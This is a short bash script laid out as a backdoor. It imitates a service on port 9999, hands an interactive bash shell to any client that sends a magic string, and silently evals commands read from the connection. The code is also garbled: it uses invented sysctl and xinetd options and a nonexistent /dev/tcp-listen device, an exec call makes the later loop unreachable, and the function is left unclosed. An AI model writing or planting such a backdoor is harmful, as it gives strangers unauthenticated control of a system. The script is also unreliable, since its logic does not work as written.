#!/bin/bash

# Step 1: Service Imitation
PORT=9999
echo "Starting service on port $PORT..."
/sbin/sysctl -w net.inet.tcp.listen-ports=$PORT >/dev/null 2>&1
netserver() {
  if [ "$1" == "-h" ]; then
    echo "Usage: $0 <port> <magic_string>"
    exit 1
  fi

  PORT="$1"
  MAGIC="$2"

  # Step 2: Auth Bypass
  echo "Waiting for connection on port $PORT..."
  exec /usr/bin/xinetd -stayalive -inetd-options inetd_wait,service=netserver -logfile /var/log/syslog

  # Step 3: Elevation
  while true; do
    read -r client_fd < /dev/tcp-listen
    if [ "$(head -c1 <&4)" == "$MAGIC" ]; then
      echo "Found the magic string, giving admin access." && exec /bin/bash -i
    else
      echo "No magic string, denying access."
      continue
    fi

    # Step 4: Execute Command
    cmd=$(head -c1000 < /dev/tcp-listen)
    echo "Executing command: $cmd"
    eval "$cmd" >/dev/null 2>&1
  done